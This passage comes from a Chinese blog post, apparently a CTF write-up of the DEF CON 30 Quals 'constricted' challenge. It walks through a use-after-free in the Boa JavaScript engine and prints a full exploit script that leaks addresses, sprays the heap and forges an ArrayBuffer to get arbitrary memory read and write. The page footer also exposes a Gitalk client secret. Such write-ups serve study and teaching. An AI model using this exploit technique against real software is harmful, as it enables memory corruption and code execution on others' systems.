+<p>但是在尝试 fake obj 上执行写入操作时，会触发 panic：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thread &#39;main&#39; panicked at &#39;Object already borrowed: BorrowMutError&#39;, boa_engine&#x2F;src&#x2F;builtins&#x2F;dataview&#x2F;mod.rs:684:40</span><br></pre></td></tr></table></figure>
+<p>调试可得知这个 <code>self.flags</code> 相对 <code>ArrayBuffer</code> 的偏移量，将其置为 <code>0</code> 后该 Panic 成功消失：</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827221449146.png" alt="image-20220827221449146"></p>
+<p>但接下来会触发一个 GC 的空指针解引用… 通过栈回溯可以看到，这个 crash 是因为 BigUint64Array 尝试获取 mut 引用时，触发了 Fake obj 的 GC 逻辑，使其开始递归 mark 子字段的数据结构。由于 fake obj 仍然存在一些问题，没能完全复原，因此在递归为 PropertyMap 进行 trace 操作时就会触发 crash：</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827223835389.png" alt="image-20220827223835389"></p>
+<p>看看有没有办法绕过 GC。阅读代码发现只要这个 root 调用的条件不满足，就可以绕过 GC:</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827224113174.png" alt="image-20220827224113174"></p>
+<p>而这个条件又和刚刚设置的 <code>self.flag</code> 有关。刚刚设置为 0 刚好踩坑了（捂脸），应该设置为 1。设置完成后就可以进入内存写入环节：</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827224237536.png" alt="image-20220827224237536"></p>
+<p>上图是在写入时触发 SIGSEGV，不过这个是非常正常的，因为 ELF 头部所在内存是没有写权限的，因此写入会终止。</p>
+<p>换个地址测试一下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test read and write</span></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x06</span>, BigInt(base_addr + <span class="number">0x1218000</span>), <span class="literal">true</span>);</span><br><span class="line">log(new_view.getBigUint64(<span class="number">0</span>).toString(<span class="number">16</span>));</span><br><span class="line">new_view.setBigUint64(<span class="number">0</span>, <span class="number">0x1122334455667788n</span>);</span><br><span class="line">log(new_view.getBigUint64(<span class="number">0</span>).toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x06</span>, BigInt(base_addr + <span class="number">0x1218100</span>), <span class="literal">true</span>);</span><br><span class="line">log(new_view.getBigUint64(<span class="number">0</span>).toString(<span class="number">16</span>));</span><br><span class="line">new_view.setBigUint64(<span class="number">0</span>, <span class="number">0x33445566778899aan</span>);</span><br><span class="line">log(new_view.getBigUint64(<span class="number">0</span>).toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>
+<p>可以看到值已经成功写入目标内存区域：</p>
+<p><img src="/2022/08/defcon30quals_constricted/image-20220827225551875.png" alt="image-20220827225551875"></p>
+<p><strong>任意地址写原语</strong>构造完成！</p>
+<h2 id="六、后续">六、后续</h2>
+<p>当<strong>任意地址读写原语</strong>构造出来后，后续的漏洞利用就是体力活了。利用任意地址读写原语，可以泄露栈、libc 等所有地址，同时也可以实现在数据段上部署 ROP 链，然后通过 stack pivot 来劫持控制流 get shell，这些就不再细讲了。</p>
+<p>以下是编写的任意地址读写原语。注意这个 exp 是在本机环境测试，因此有些偏移或堆分布等会存在一些差异。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tools wrapper</span></span><br><span class="line"><span class="keyword">let</span> log = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123; <span class="built_in">console</span>.log(x) &#125;;</span><br><span class="line"><span class="keyword">let</span> debug = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123; log(<span class="built_in">console</span>.debug(x)) &#125;;</span><br><span class="line"><span class="keyword">let</span> gc = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.collectGarbage();</span><br><span class="line"><span class="keyword">let</span> bp = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.sysbreak();</span><br><span class="line"><span class="keyword">let</span> sleep = <span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.sleep(x);</span><br><span class="line"><span class="keyword">let</span> hex = <span class="function">(<span class="params">x</span>) =&gt;</span> (<span class="string">"0x"</span> + x.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// parse tools</span></span><br><span class="line"><span class="comment">// let get_js_value = (obj) =&gt; </span></span><br><span class="line"><span class="comment">//     Number.parseInt(console.debug(obj).split("JsValue @")[1].split("\n")[0]);</span></span><br><span class="line"><span class="keyword">let</span> get_obj_addr = <span class="function">(<span class="params">obj</span>) =&gt;</span> </span><br><span class="line">    <span class="built_in">Number</span>.parseInt(<span class="built_in">console</span>.debug(obj).split(<span class="string">"Object @"</span>)[<span class="number">1</span>].split(<span class="string">"\n"</span>)[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">let</span> get_method_addr = <span class="function">(<span class="params">obj</span>) =&gt;</span> </span><br><span class="line">    <span class="built_in">Number</span>.parseInt(<span class="built_in">console</span>.debug(obj).split(<span class="string">"Methods @"</span>)[<span class="number">1</span>].split(<span class="string">"\n"</span>)[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">let</span> get_buffer_data_addr = <span class="function">(<span class="params">obj</span>) =&gt;</span> </span><br><span class="line">    <span class="built_in">Number</span>.parseInt(<span class="built_in">console</span>.debug(obj).split(<span class="string">"Buffer Data @"</span>)[<span class="number">1</span>].split(<span class="string">"\n"</span>)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_timeout = &#123; valueOf() &#123;</span><br><span class="line">    log(<span class="string">"[+] fake_timeout called"</span>);</span><br><span class="line">    sleep(<span class="number">2000</span>);</span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. leak heap addresses</span></span><br><span class="line"><span class="keyword">let</span> cache = <span class="keyword">new</span> TimedCache();</span><br><span class="line">cache.set(<span class="string">'leak'</span>, <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">20</span>), <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">let</span> uaf_obj = cache.get(<span class="string">"leak"</span>, fake_timeout);</span><br><span class="line"></span><br><span class="line">debug(uaf_obj);</span><br><span class="line">log(uaf_obj.length)</span><br><span class="line"><span class="comment">// for (let i = 0; i &lt; uaf_obj.length; ++i) &#123;</span></span><br><span class="line"><span class="comment">//     log(i + " =&gt; " + uaf_obj[i]);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">lower_heap_addr = uaf_obj[<span class="number">3</span>] * <span class="number">0x100000000</span> + uaf_obj[<span class="number">2</span>] - <span class="number">0x440f0</span>;</span><br><span class="line">base_addr = uaf_obj[<span class="number">5</span>] * <span class="number">0x100000000</span> + uaf_obj[<span class="number">4</span>] - <span class="number">0x11a9678</span>;</span><br><span class="line">higher_heap_addr = uaf_obj[<span class="number">17</span>] * <span class="number">0x100000000</span> + uaf_obj[<span class="number">16</span>] - <span class="number">0x1f07</span>;</span><br><span class="line">log(<span class="string">"[+] lower_heap_addr: "</span> + hex(lower_heap_addr)); </span><br><span class="line">log(<span class="string">"[+] higher_heap_addr: "</span> + hex(higher_heap_addr));</span><br><span class="line">log(<span class="string">"[+] base_addr: "</span> + hex(base_addr));</span><br><span class="line"><span class="keyword">if</span> (((lower_heap_addr | higher_heap_addr | base_addr) &amp; <span class="number">0xfff</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    log(<span class="string">"[-] Error wrong addr."</span>)</span><br><span class="line">    bp(); <span class="comment">// quit</span></span><br><span class="line">&#125;</span><br><span class="line">log(<span class="string">"[+] Leak successfuly."</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. heap spray</span></span><br><span class="line"><span class="keyword">let</span> new_cache = <span class="keyword">new</span> TimedCache();</span><br><span class="line">new_cache.set(<span class="string">'spray'</span>, &#123;<span class="attr">a</span>:&#123;&#125;, <span class="attr">b</span>:&#123;&#125;&#125;, <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">let</span> new_uaf_obj = new_cache.get(<span class="string">"spray"</span>, fake_timeout);</span><br><span class="line">debug(new_uaf_obj)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> spray_objs = [];</span><br><span class="line"><span class="comment">// 事实上只要分配一次就够了</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x180</span>);</span><br><span class="line">    debug(obj);</span><br><span class="line">    spray_objs.push(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get_buffer_data_addr(spray_objs[<span class="number">0</span>]) + <span class="number">0x28</span> != get_obj_addr(new_uaf_obj)) &#123;</span><br><span class="line">    log(<span class="string">"[-] Error heap spray failed."</span>)</span><br><span class="line">    bp(); <span class="comment">// quit</span></span><br><span class="line">&#125;</span><br><span class="line">log(<span class="string">"[+] Heap spray successfuly."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. fake obj</span></span><br><span class="line"><span class="keyword">let</span> views = <span class="keyword">new</span> <span class="built_in">DataView</span>(spray_objs[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// // debug write</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; views.byteLength / <span class="number">8</span>; i++)</span><br><span class="line">    views.setBigUint64(<span class="number">8</span>*i, BigInt(i*<span class="number">0x10000</span> + i), <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// try to restore the data</span></span><br><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">// ArrayBuffer ptr</span></span><br><span class="line"><span class="keyword">let</span> ptr = base_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">// mem chunk header</span></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x00</span>, <span class="number">0x00n</span>, <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x01</span>, BigInt(lower_heap_addr + <span class="number">0x440f0</span>), <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x02</span>, BigInt(base_addr + <span class="number">0x11a9678</span>), <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x03</span>, <span class="number">0x100n</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// mut borrow flag</span></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x04</span>, <span class="number">0x01n</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Object Kind (ArrayBuffer)</span></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x05</span>, <span class="number">0x02n</span>, <span class="literal">true</span>);        </span><br><span class="line"><span class="comment">// Target pointer</span></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x06</span>, BigInt(ptr), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// some size</span></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x07</span>, <span class="number">0x100n</span>, <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x08</span>, <span class="number">0x100n</span>, <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x09</span>, <span class="number">0x100n</span>, <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x0a</span>, <span class="number">0x101n</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x0e</span>, BigInt(ptr), <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x0f</span>, <span class="number">0x100n</span>, <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x10</span>, <span class="number">0x100n</span>, <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x11</span>, BigInt(get_method_addr(ab)), <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x13</span>, BigInt(base_addr + <span class="number">0xeab740</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x1a</span>, <span class="number">0x08n</span>, <span class="literal">true</span>);</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x21</span>, <span class="number">0x08n</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x13</span>, <span class="number">0x08n</span>, BigInt(base_addr + <span class="number">0xeab740</span>));</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x17</span>, <span class="number">0x08n</span>, BigInt(base_addr + <span class="number">0xeab740</span>));</span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x1e</span>, <span class="number">0x08n</span>, BigInt(base_addr + <span class="number">0xeab740</span>));</span><br><span class="line"></span><br><span class="line">debug(ab);</span><br><span class="line">debug(new_uaf_obj);</span><br><span class="line"><span class="comment">// bp();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> new_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(new_uaf_obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// test read and write</span></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x06</span>, BigInt(base_addr + <span class="number">0x1218000</span>), <span class="literal">true</span>);</span><br><span class="line">log(new_view.getBigUint64(<span class="number">0</span>).toString(<span class="number">16</span>));</span><br><span class="line">new_view.setBigUint64(<span class="number">0</span>, <span class="number">0x1122334455667788n</span>);</span><br><span class="line">log(new_view.getBigUint64(<span class="number">0</span>).toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">views.setBigUint64(<span class="number">8</span> * <span class="number">0x06</span>, BigInt(base_addr + <span class="number">0x1218100</span>), <span class="literal">true</span>);</span><br><span class="line">log(new_view.getBigUint64(<span class="number">0</span>).toString(<span class="number">16</span>));</span><br><span class="line">new_view.setBigUint64(<span class="number">0</span>, <span class="number">0x33445566778899aan</span>);</span><br><span class="line">log(new_view.getBigUint64(<span class="number">0</span>).toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">bp();</span><br></pre></td></tr></table></figure>
+<p>本题复盘结束。在这次复盘中，主要学习了 rust 在二进制层面的一些特性，同时也算通过这题入了 rust pwn 的一个小门。</p>
+<h2 id="七、参考">七、参考</h2>
+<p>本次复盘全程参考 r3kapig Defcon-30-Quals 文档 + 群内消息记录讨论，感谢 r3kapig 诸位师傅！</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2022/08/defcon30quals_constricted/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/08/defcon30quals_smugglers_cove/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Defcon-30-Quals smuggler&#39;s cove 复盘笔记
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/08/thread_canary/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">浅析 Linux 程序的 Canary 机制</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
